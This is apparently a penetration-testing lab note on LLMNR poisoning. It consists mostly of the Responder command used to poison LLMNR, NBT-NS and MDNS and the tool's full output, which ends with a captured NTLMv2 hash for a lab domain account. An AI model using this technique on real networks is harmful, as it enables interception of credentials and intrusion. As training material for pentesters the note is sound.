# Initial attack vectors

## LLMNR Poisoning

Link Local Multicast Name Resolution

* used to identify hosts when DNS fails to do so
* Previously NBT-NS

{% code overflow="wrap" %}
```
sudo responder -I eth0 -dwPv
.----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.41.128]
    Responder IPv6             [fe80::20c:29ff:fe5c:7a6c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-F3WSZEU1JYY]
    Responder Domain Name      [Q5N4.LOCAL]
    Responder DCE-RPC Port     [45738]

[+] Listening for events...                                                                                                                                                                                                                 

[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
[*] [MDNS] Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER.local
[*] [LLMNR]  Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER                                                                                                                                                          
[*] [DHCP] Acknowledged DHCP Discover for IP: 0.0.0.0, Req IP: 192.168.41.134, MAC: 00:0C:29:46:57:E4                                                                                                                                       
[*] [DHCP] Acknowledged DHCP Request for IP: 0.0.0.0, Req IP: 192.168.41.134, MAC: 00:0C:29:46:57:E4                                                                                                                                        
[*] [MDNS] Poisoned answer sent to 192.168.41.134  for name THEPUNISHER.local                                                                                                                                                               
[*] [MDNS] Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER.local                                                                                                                                                      
[*] [LLMNR]  Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER                                                                                                                                                          
[*] [LLMNR]  Poisoned answer sent to 192.168.41.134 for name THEPUNISHER                                                                                                                                                                    
[*] [MDNS] Poisoned answer sent to 192.168.41.134  for name THEPUNISHER.local                                                                                                                                                               
[*] [MDNS] Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER.local                                                                                                                                                      
[*] [LLMNR]  Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER                                                                                                                                                          
[*] [LLMNR]  Poisoned answer sent to 192.168.41.134 for name THEPUNISHER                                                                                                                                                                    
[*] [MDNS] Poisoned answer sent to 192.168.41.134  for name THEPUNISHER.local                                                                                                                                                               
[*] [LLMNR]  Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER                                                                                                                                                          
[*] [MDNS] Poisoned answer sent to fe80::dda2:bc9:55b2:1472 for name THEPUNISHER.local                                                                                                                                                      
[*] [LLMNR]  Poisoned answer sent to 192.168.41.134 for name THEPUNISHER                                                                                                                                                                    
[*] [MDNS] Poisoned answer sent to 192.168.41.130  for name HYDRA-DC.local                                                                                                                                                                  
[*] [MDNS] Poisoned answer sent to fe80::414b:5d01:74bb:42a2 for name HYDRA-DC.local                                                                                                                                                        
[*] [LLMNR]  Poisoned answer sent to fe80::414b:5d01:74bb:42a2 for name HYDRA-DC                                                                                                                                                            
[*] [LLMNR]  Poisoned answer sent to 192.168.41.130 for name HYDRA-DC                                                                                                                                                                       
[SMB] NTLMv2-SSP Client   : 192.168.41.134                                                                                                                                                                                                  
[SMB] NTLMv2-SSP Username : MARVEL\fcastle                                                                                                                                                                                                  
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:1f55fcc59e764a38:F45EBADD8E833B9F030503A4204A038D:010100000000000000781B5FC656DA01BD8ABAE622D787810000000002000800510035004E00340001001E00570049004E002D0046003300570053005A004500550031004A005900590004003400570049004E002D0046003300570053005A004500550031004A00590059002E00510035004E0034002E004C004F00430041004C0003001400510035004E0034002E004C004F00430041004C0005001400510035004E0034002E004C004F00430041004C000700080000781B5FC656DA0106000400020000000800300030000000000000000100000000200000BBFC14BC2E9688CF9859590704B24CE1FF94411889C1094FE249CD6CBD4139050A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340031002E003100320038000000000000000000 
```
{% endcode %}
